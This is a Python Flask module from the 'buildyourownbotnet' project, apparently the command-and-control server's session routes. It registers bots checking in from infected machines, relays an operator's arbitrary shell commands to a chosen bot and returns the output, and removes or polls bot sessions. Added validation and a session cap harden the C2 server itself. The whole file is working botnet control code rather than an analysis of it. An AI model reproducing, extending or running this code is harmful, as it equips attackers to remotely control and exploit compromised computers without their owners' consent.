import re
from datetime import datetime
from flask import current_app, Blueprint, request, redirect, url_for, flash, jsonify
from flask_login import login_user, logout_user, current_user, login_required
from buildyourownbotnet import c2
from buildyourownbotnet.core.dao import session_dao, task_dao, user_dao
from buildyourownbotnet.models import db, Session

# Blueprint
session = Blueprint('session', __name__)

# Bot-supplied metadata must not be able to set database identity or state
# fields directly. Only these descriptive columns are accepted.
SESSION_FIELDS = frozenset({
	'public_ip', 'local_ip', 'mac_address', 'username', 'administrator',
	'platform', 'device', 'architecture', 'latitude', 'longitude',
})
UID_RE = re.compile(r'^[0-9a-f]{32}$')
MAX_SESSIONS_PER_OWNER = 100


@session.route("/api/session/new", methods=["POST"])
def session_new():
	"""Add session metadata to database."""
	if not request.json or not isinstance(request.json, dict):
		return jsonify({'error': 'JSON object required'}), 400

	data = {key: value for key, value in request.json.items() if key in SESSION_FIELDS}
	owner = request.json.get('owner')
	user = user_dao.get_user(username=owner) if isinstance(owner, str) else None
	if user is None:
		return jsonify({'error': 'unknown owner'}), 400
	data['owner'] = user.username

	uid = request.json.get('uid')
	if uid is not None and (not isinstance(uid, str) or not UID_RE.fullmatch(uid)):
		return jsonify({'error': 'invalid session uid'}), 400

	# The endpoint is reachable from the C2 socket, not an operator login.
	# Bound the number of fake sessions one owner can create.
	if Session.query.filter_by(owner=user.username).count() >= MAX_SESSIONS_PER_OWNER:
		return jsonify({'error': 'session limit reached'}), 429

	data['uid'] = uid
	# DAO expects a joined timestamp even when the bot supplied a uid.
	data['joined'] = datetime.utcnow()
	session_metadata = session_dao.handle_session(data)
	return jsonify(session_metadata)

@session.route("/api/session/remove", methods=["POST"])
@login_required
def session_remove():
	"""End an active session."""
	session_uid = request.form.get('session_uid')

	if not session_uid:
		flash('Invalid session UID', 'danger')
		return redirect(url_for('main.sessions'))

	# kill connection to C2
	owner_sessions = c2.sessions.get(current_user.username, {})

	if session_uid and session_uid in owner_sessions:
		session_thread = owner_sessions[session_uid]
		try:
			session_thread.kill()
		except Exception as e:
			return "Error ending session - please try again."

	# remove session from database
	s = session_dao.delete_session(session_uid)
	return "Session {} removed.".format(session_uid)


@session.route("/api/session/cmd", methods=["POST"])
@login_required
def session_cmd():
	"""Send commands to clients and return the response."""
	session_uid = request.form.get('session_uid')

	# validate session id is valid integer
	if not session_uid:
		flash("Invalid bot UID: " + str(session_uid))
		return redirect(url_for('main.sessions'))

	command = request.form.get('cmd')

	# get user sessions
	owner_sessions = c2.sessions.get(current_user.username, {})

	if session_uid in owner_sessions:
		session_thread = owner_sessions[session_uid]

		# store issued task in database
		task = task_dao.handle_task({'task': command, 'session': session_thread.info.get('uid')})

		# send task and get response
		session_thread.send_task(task)
		response = session_thread.recv_task()

		# update task record with result in database
		result = task_dao.handle_task(response)
		return str(result['result']).encode()

	else:
		return "Bot " + str(session_uid) + " is offline or does not exist."


@session.route("/api/session/poll", methods=["GET"])
@login_required
def session_poll():
	"""Return list of sessions (JSON)."""
	new_sessions = []
	for s in session_dao.get_user_sessions_new(current_user.id):
		new_sessions.append(s.serialize())
		s.new = False
		db.session.commit()
	return jsonify(new_sessions)
